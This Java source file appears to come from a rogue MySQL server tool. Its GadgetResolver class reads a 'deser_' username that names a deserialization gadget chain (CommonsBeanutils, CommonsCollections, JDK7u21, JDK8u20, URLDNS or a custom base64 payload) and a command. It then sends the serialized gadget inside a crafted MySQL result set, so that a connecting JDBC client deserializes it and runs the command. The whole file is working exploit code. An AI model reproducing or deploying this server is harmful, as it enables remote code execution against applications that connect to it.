package me.n1ar4.fake.proto;

import me.n1ar4.fake.gadget.*;
import me.n1ar4.fake.log.LogUtil;
import me.n1ar4.fake.proto.constant.Resp;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Objects;

public class GadgetResolver implements Resolver {
    private static final Logger log = LogManager.getLogger(GadgetResolver.class);
    private static String customBase64Gadget;
    private final OutputStream outputStream;
    private final String username;

    public GadgetResolver(OutputStream outputStream, String username) {
        this.outputStream = outputStream;
        this.username = username;
    }

    public static void setCustomGadget(String base64) {
        customBase64Gadget = base64;
    }

    public void resolve() {
        try {
            if (!username.startsWith("deser_")) {
                return;
            }
            String[] sps = username.split("_");
            if (sps.length < 2) {
                return;
            }
            String gadget = sps[1];

            StringBuilder builder;
            String cmd = null;
            if (!gadget.equals("CUSTOM")) {
                builder = new StringBuilder();
                for (int i = 2; i < sps.length; i++) {
                    builder.append(sps[i]);
                    if (i != sps.length - 1) {
                        builder.append("_");
                    }
                }
                cmd = builder.toString();
            }

            log.info("mode: deserialization");
            LogUtil.log("mode: deserialization");

            byte[] first = PacketHelper.buildPacket(5, new byte[]{(byte) 0x03});
            outputStream.write(Objects.requireNonNull(first));
            outputStream.flush();

            List<Byte> columns = new ArrayList<>();
            columns.addAll(ColumnPacket.bytesToList(
                    Objects.requireNonNull(PacketHelper.buildPacket(2,
                            ColumnPacket.buildColumnPacket("a")))));
            columns.addAll(ColumnPacket.bytesToList(
                    Objects.requireNonNull(PacketHelper.buildPacket(3,
                            ColumnPacket.buildColumnPacket("b")))));
            columns.addAll(ColumnPacket.bytesToList(
                    Objects.requireNonNull(PacketHelper.buildPacket(4,
                            ColumnPacket.buildColumnPacket("c")))));
            outputStream.write(ColumnPacket.listToBytes(columns));
            outputStream.flush();

            outputStream.write(Objects.requireNonNull(
                    PacketHelper.buildPacket(6, Resp.EOF)));
            outputStream.flush();

            byte[] data;
            switch (gadget) {
                case "CB":
                    data = SerUtil.serializeObject(new CB().getObject(cmd));
                    break;
                case "CC31":
                    data = SerUtil.serializeObject(new CC31().getObject(cmd));
                    break;
                case "CC44":
                    data = SerUtil.serializeObject(new CC44().getObject(cmd));
                    break;
                case "JDK7U21":
                    data = SerUtil.serializeObject(new JDK7U21().getObject(cmd));
                    break;
                case "JDK8U20":
                    data = JDK8U20.getObject(cmd);
                    break;
                case "URLDNS":
                    data = SerUtil.serializeObject(new URLDNS().getObject(cmd));
                    break;
                case "CUSTOM":
                    if (customBase64Gadget == null || customBase64Gadget.isEmpty()) {
                        LogUtil.log("must set custom gadget data first");
                        return;
                    }
                    data = Base64.getDecoder().decode(customBase64Gadget);
                    break;
                default:
                    return;
            }
            log.info("gadget: {}", gadget);
            LogUtil.log("user gadget: " + gadget.toLowerCase());

            if (cmd != null) {
                log.info("cmd (params): {}", cmd);
                LogUtil.log("cmd (params): " + cmd);
            }

            if (gadget.equals("CUSTOM")) {
                log.info("use custom gadget");
                LogUtil.log("use custom gadget");
            }

            outputStream.write(Objects.requireNonNull(PacketHelper.buildPacket(6,
                    ColumnPacket.buildColumnValuesPacket(
                            new byte[][]{"111".getBytes(), data, "222".getBytes()}
                    ))));
            outputStream.flush();

            outputStream.write(Objects.requireNonNull(
                    PacketHelper.buildPacket(7, Resp.EOF)));
            outputStream.flush();
        } catch (Exception ex) {
            log.error("gadget resolver error: {}", ex.toString());
        }
    }
}
